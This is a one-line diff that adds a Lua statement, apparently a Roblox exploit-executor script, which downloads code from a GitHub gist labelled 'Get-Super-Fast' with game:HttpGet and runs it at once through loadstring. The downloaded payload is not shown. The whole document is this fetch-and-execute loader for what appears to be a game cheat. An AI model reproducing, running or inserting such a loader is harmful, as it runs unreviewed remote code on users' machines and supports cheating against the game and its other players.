@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/ruwten/2d6b21cd28d1a6858ce71bf2ca0d97a4/raw/83eea1b8f0ae52828bf23fe4f19bc148a74ab344/Get-Super-Fast"))()
